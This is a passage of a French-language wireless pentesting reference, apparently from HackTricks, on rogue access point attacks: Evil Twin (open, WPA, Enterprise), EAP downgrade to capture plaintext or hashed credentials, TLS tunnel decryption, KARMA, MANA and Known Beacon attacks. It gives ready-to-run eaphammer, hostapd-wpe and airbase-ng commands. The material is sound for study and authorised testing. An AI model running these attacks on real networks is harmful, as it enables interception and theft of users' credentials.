echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Une attaque evil twin exploite la façon dont les clients WiFi reconnaissent les réseaux, reposant principalement sur le nom du réseau (ESSID) sans exiger que la base station (access point) s'authentifie auprès du client. Points clés :

- **Difficulté à distinguer** : Les appareils peinent à distinguer les access points légitimes des rogue access points lorsqu'ils partagent le même ESSID et le même type de chiffrement. Les réseaux réels utilisent souvent plusieurs access points avec le même ESSID pour étendre la couverture de façon transparente.
- **Itinérance des clients et manipulation de connexion** : Le protocole 802.11 permet aux appareils d'itinerer entre access points au sein du même ESS. Les attaquants peuvent exploiter cela en incitant un appareil à se déconnecter de sa base station actuelle et à se connecter à un rogue one. Cela peut être réalisé en offrant un signal plus fort ou en perturbant la connexion à l'access point légitime via des méthodes comme deauthentication packets ou jamming.
- **Défis d'exécution** : Exécuter avec succès une evil twin attack dans des environnements avec plusieurs access points bien placés peut être difficile. Deauthenticating un seul access point légitime entraîne souvent la connexion de l'appareil à un autre access point légitime à moins que l'attaquant puisse deauthenticate tous les access points à proximité ou placer stratégiquement le rogue access point.

You can create a very basic Open Evil Twin (no capabilities to route traffic to Internet) doing:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Vous pouvez aussi créer un Evil Twin en utilisant **eaphammer** (notez que pour créer des evil twins avec eaphammer l'interface **ne doit PAS** être en mode **monitor**) :
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Or using Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

Veuillez noter que, par défaut, si un ESSID dans le PNL est enregistré comme protégé par WPA, l'appareil ne se connectera pas automatiquement à un Open evil Twin. Vous pouvez essayer de DoS le vrai AP et espérer que l'utilisateur se connectera manuellement à votre Open evil Twin, ou vous pouvez DoS le vrai AP et utiliser un WPA Evil Twin pour capturer le handshake (avec cette méthode vous ne pourrez pas permettre à la victime de se connecter à vous car vous ne connaissez pas le PSK, mais vous pouvez capturer le handshake et tenter de le crack).

_Certains OS et AV avertiront l'utilisateur que se connecter à un réseau Open est dangereux..._

### WPA/WPA2 Evil Twin

Vous pouvez créer un **Evil Twin utilisant WPA/2** et si les appareils sont configurés pour se connecter à ce SSID avec WPA/2, ils vont essayer de se connecter. Quoi qu'il en soit, **pour compléter le 4-way-handshake** vous devez aussi **connaître** le **mot de passe** que le client va utiliser. Si vous **ne le connaissez pas**, la **connexion ne sera pas complétée**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Pour comprendre cette attaque, je recommande de lire d'abord le bref [WPA Enterprise explanation](#wpa-enterprise-mgt).

**Utilisation de hostapd-wpe**

`hostapd-wpe` nécessite un fichier **de configuration** pour fonctionner. Pour **automatiser** la génération de ces configurations vous pouvez utiliser [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) (téléchargez le fichier python dans _/etc/hostapd-wpe/_)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
Dans le fichier de configuration, vous pouvez sélectionner de nombreux éléments différents comme ssid, channel, user files, cret/key, dh parameters, wpa version et auth...

[**Utiliser hostapd-wpe avec EAP-TLS pour permettre à n'importe quel certificat de se connecter.**](evil-twin-eap-tls.md)

**Utiliser EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Par défaut, EAPHammer utilise les méthodes d'authentification suivantes (remarquez GTC en premier pour tenter d'obtenir des plaintext passwords, puis l'utilisation de auth methods plus robustes) :
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Ceci est la méthodologie par défaut pour éviter de longs temps de connexion. Cependant, vous pouvez aussi spécifier au server les authentication methods de la plus faible à la plus forte :
```
--negotiate weakest
```
Or you could also use:

- `--negotiate gtc-downgrade` to use highly efficient GTC downgrade implementation (plaintext passwords)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` to specify manually the methods offered (offering the same auth methods in the same order as the organisation the attack will be much more difficult to detect).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Utilisation d'Airgeddon**

`Airgeddon` peut utiliser des certificats générés auparavant pour proposer une authentification EAP aux réseaux WPA/WPA2-Enterprise. Le réseau factice rétrogradera le protocole de connexion en EAP-MD5 de sorte qu'il pourra **capturer l'utilisateur et le MD5 du mot de passe**. Plus tard, l'attaquant peut tenter de craquer le mot de passe.\
`Airggedon` vous offre la possibilité d'une **attaque Evil Twin continue (bruyante)** ou de **créer uniquement l'Evil Twin jusqu'à ce que quelqu'un se connecte (silencieuse).**

![](<../../images/image (936).png>)

### Débogage des tunnels TLS PEAP et EAP-TTLS dans les attaques Evil Twin

_Cette méthode a été testée sur une connexion PEAP mais comme je déchiffre un tunnel TLS arbitraire, cela devrait également fonctionner avec EAP-TTLS_

Dans la **configuration** de _hostapd-wpe_, **mettez en commentaire** la ligne qui contient _**dh_file**_ (de `dh_file=/etc/hostapd-wpe/certs/dh` à `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Cela fera que `hostapd-wpe` **échange les clés en utilisant RSA** au lieu de DH, vous permettant ainsi de **déchiffrer** le trafic plus tard **en connaissant la clé privée du serveur**.

Démarrez maintenant l'**Evil Twin** en utilisant **`hostapd-wpe`** avec cette configuration modifiée comme d'habitude. Lancez également **`wireshark`** sur l'**interface** qui réalise l'attaque Evil Twin.

Maintenant ou plus tard (lorsque vous avez déjà capturé quelques tentatives d'authentification) vous pouvez ajouter la clé RSA privée à wireshark dans : `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Ajoutez une nouvelle entrée et remplissez le formulaire avec ces valeurs : **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**sélectionnez votre fichier de clé**, pour éviter les problèmes sélectionnez un fichier de clé **non protégé par mot de passe**).

![](<../../images/image (687).png>)

Et regardez le nouvel onglet **"Decrypted TLS"**:

![](<../../images/image (231).png>)

## Attaque KARMA, MANA, Loud MANA et Known beacons

### Listes blanche/noire ESSID et MAC

Différents types de Media Access Control Filter Lists (MFACLs) et leurs modes correspondants ainsi que leurs effets sur le comportement d'un rogue Access Point (AP) :

1. **Liste blanche basée sur le MAC**:
- Le rogue AP ne répondra qu'aux requêtes de probe provenant des appareils spécifiés dans la liste blanche, restant invisible pour tous les autres non listés.
2. **Liste noire basée sur le MAC**:
- Le rogue AP ignorera les requêtes de probe provenant des appareils présents sur la liste noire, rendant effectivement le rogue AP invisible pour ces appareils spécifiques.
3. **Liste blanche basée sur SSID**:
- Le rogue AP répondra aux requêtes de probe uniquement pour des ESSID spécifiques listés, se rendant invisible aux appareils dont les Preferred Network Lists (PNLs) ne contiennent pas ces ESSID.
4. **Liste noire basée sur SSID**:
- Le rogue AP ne répondra pas aux requêtes de probe pour les ESSID spécifiques sur la liste noire, le rendant invisible aux appareils recherchant ces réseaux particuliers.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Cette méthode permet à un **attaquant de créer un point d'accès malveillant (AP) qui répond à toutes les probe requests** des appareils cherchant à se connecter à des réseaux. Cette technique **trompe les appareils afin qu'ils se connectent à l'AP de l'attaquant** en imitant les réseaux que les appareils recherchent. Lorsqu'un appareil envoie une demande de connexion à cet AP malveillant, la connexion se réalise, entraînant la connexion involontaire de l'appareil au réseau de l'attaquant.

### MANA

Puis, **les appareils ont commencé à ignorer les réponses réseau peu fiables**, réduisant l'efficacité de l'attaque karma originale. Cependant, une nouvelle méthode, connue sous le nom de **MANA attack**, a été introduite par Ian de Villiers et Dominic White. Cette méthode implique que l'AP malveillant **capture les Preferred Network Lists (PNL) des appareils en répondant à leurs broadcast probe requests** avec des noms de réseaux (SSIDs) précédemment reconnus par les appareils. Cette attaque sophistiquée contourne les protections contre l'attaque karma originale en exploitant la manière dont les appareils mémorisent et priorisent les réseaux connus.

The MANA attack opère en surveillant à la fois les directed et broadcast probe requests émises par les appareils. Pour les directed requests, il enregistre l'adresse MAC de l'appareil et le nom du réseau demandé, ajoutant ces informations à une liste. Lorsqu'une broadcast request est reçue, l'AP répond avec des informations correspondant à l'un des réseaux présents dans la liste de l'appareil, incitant ainsi l'appareil à se connecter à l'AP malveillant.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

Une **Loud MANA attack** est une stratégie avancée utilisée lorsque les appareils n'utilisent pas de directed probing ou lorsque leurs Preferred Network Lists (PNL) sont inconnues de l'attaquant. Elle repose sur le principe que **les appareils dans la même zone ont de fortes chances de partager certains noms de réseau dans leurs PNL**. Plutôt que de répondre de manière sélective, cette attaque diffuse des probe responses pour chaque nom de réseau (ESSID) trouvé dans les PNL combinées de tous les appareils observés. Cette approche large augmente la probabilité qu'un appareil reconnaisse un réseau familier et tente de se connecter au rogue Access Point (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Lorsque la **Loud MANA attack** peut ne pas suffire, la **Known Beacon attack** offre une autre approche. Cette méthode **brute-forces le processus de connexion en simulant un AP qui répond à n'importe quel nom de réseau, en parcourant une liste d'ESSIDs potentielles** dérivée d'un wordlist. Cela simule la présence de nombreux réseaux, dans l'espoir de faire correspondre un ESSID présent dans le PNL de la victime, ce qui provoquera une tentative de connexion vers l'AP fabriqué. L'attaque peut être amplifiée en la combinant avec l'option `--loud` pour une tentative plus agressive d'attirer les appareils.

Eaphammer a implémenté cette attaque comme une MANA attack où tous les ESSIDs d'une liste sont chargés (vous pouvez également combiner cela avec `--loud` pour créer un Loud MANA + Known beacons attack):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
La **Known Beacon Burst attack** implique **diffusion en rafale de beacon frames pour chaque ESSID listé dans un fichier**. Cela crée un environnement dense de réseaux factices, augmentant fortement la probabilité que des appareils se connectent au rogue AP, surtout lorsqu'elle est combinée à une MANA attack. Cette technique mise sur la vitesse et le volume pour submerger les mécanismes de sélection de réseau des appareils.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** est un protocole permettant à des appareils de se connecter directement entre eux via le Wi‑Fi sans avoir besoin d'un point d'accès sans fil traditionnel. Cette fonctionnalité est intégrée à divers appareils de l'Internet des objets (IoT), tels que les imprimantes et les télévisions, facilitant la communication directe entre appareils. Une caractéristique notable de Wi‑Fi Direct est qu'un appareil assume le rôle d'un point d'accès, connu sous le nom de group owner, pour gérer la connexion.

La sécurité des connexions Wi‑Fi Direct est assurée par **Wi‑Fi Protected Setup (WPS)**, qui prend en charge plusieurs méthodes d'appairage sécurisé, notamment :

- **Push-Button Configuration (PBC)**
- **saisie du PIN**
- **Communication en champ proche (NFC)**

Ces méthodes, en particulier la saisie du PIN, sont exposées aux mêmes vulnérabilités que WPS dans les réseaux Wi‑Fi traditionnels, ce qui en fait des cibles pour des vecteurs d'attaque similaires.

### EvilDirect Hijacking

**EvilDirect Hijacking** est une attaque spécifique à Wi‑Fi Direct. Elle reprend le concept d'une attaque Evil Twin mais cible les connexions Wi‑Fi Direct. Dans ce scénario, un attaquant usurpe un group owner légitime afin de tromper des appareils pour qu'ils se connectent à une entité malveillante. Cette méthode peut être exécutée en utilisant des outils comme `airbase-ng` en spécifiant le canal, l'ESSID et l'adresse MAC de l'appareil usurpé :

## References

- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)


TODO : jeter un œil à [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (connexion via Facebook et imitation de WPA dans des portails captifs)

{{#include ../../banners/hacktricks-training.md}}
